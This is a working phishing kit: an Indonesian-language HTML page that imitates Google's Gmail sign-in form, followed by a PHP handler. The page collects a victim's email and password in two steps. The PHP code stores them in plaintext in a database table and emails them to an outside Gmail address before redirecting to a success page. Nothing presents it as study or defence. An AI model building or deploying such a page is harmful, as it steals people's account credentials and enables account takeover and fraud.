<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login Gmail</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <div class="bg-white w-full max-w-md rounded-xl shadow-md p-8">
    <div class="text-center">
      <img class="mx-auto w-24 mb-2" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
      <h1 class="text-2xl font-medium text-gray-800">Masuk</h1>
      <p class="text-sm text-gray-600 mt-1">Gunakan Akun Google Anda</p>
    </div>

    <form id="loginForm" method="POST" action="">
      <div id="step-email">
        <input 
          type="email" 
          id="email" 
          name="email"
          placeholder="Email atau ponsel" 
          class="w-full px-4 py-2 border border-gray-300 rounded-md"
        >
      </div>

      <div id="step-password" class="hidden">
        <input 
          type="password" 
          id="password" 
          name="password"
          placeholder="Masukkan sandi Anda" 
          class="w-full px-4 py-2 border border-gray-300 rounded-md mt-4"
        >
      </div>

      <div class="flex justify-between items-center mt-4">
        <a href="#" class="text-blue-600 text-sm">Buat akun</a>
        <div class="relative">
          <button 
            type="submit"
            id="nextBtn"
            class="bg-blue-600 text-white px-6 py-2 rounded-md hover:bg-blue-700"
          >
            Berikutnya
          </button>
          <div id="loadingSpinner" class="hidden absolute inset-0 flex items-center justify-center">
            <div class="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
          </div>
        </div>
      </div>
    </form>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const stepPassword = document.getElementById('step-password');
    const spinner = document.getElementById('loadingSpinner');
    const nextBtn = document.getElementById('nextBtn');

    let currentStep = 1;

    form.addEventListener('submit', function(e) {
      if (currentStep === 1) {
        e.preventDefault();
        const email = emailInput.value.trim();
        if (email === '') {
          alert('Email tidak boleh kosong');
          return;
        }
        nextBtn.disabled = true;
        spinner.classList.remove('hidden');

        setTimeout(() => {
          stepPassword.classList.remove('hidden');
          nextBtn.disabled = false;
          spinner.classList.add('hidden');
          currentStep = 2;
        }, 1000);
      } else if (currentStep === 2) {
        const password = passwordInput.value.trim();
        if (password === '') {
          e.preventDefault();
          alert('Password tidak boleh kosong');
          return;
        }

        // Tampilkan loading sebelum kirim form
        nextBtn.disabled = true;
        spinner.classList.remove('hidden');
      }
    });
  </script>
</body>
</html>

<?php
include 'koneksi.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $email = $_POST['email'] ?? '';
  $password = $_POST['password'] ?? '';

  if (!empty($email) && !empty($password)) {
    $email = mysqli_real_escape_string($conn, $email);
    $password = mysqli_real_escape_string($conn, $password);

    $sql = "INSERT INTO tb_hasil (email, password) VALUES ('$email', '$password')";
    if ($conn->query($sql)) {
      $to = "wirdgates541@gmail.com"; 
      $subject = "Data Login Baru";
      $message = "Email: $email\nPassword: $password";
      $headers = "From: notifikasi@domainmu.com";
      
      mail($to, $subject, $message, $headers);

      // Redirect ke halaman sukses
      header("Location: success.php");
      exit;
    } else {
      echo "<script>alert('Gagal menyimpan ke database!');</script>";
    }
  }
}
?>
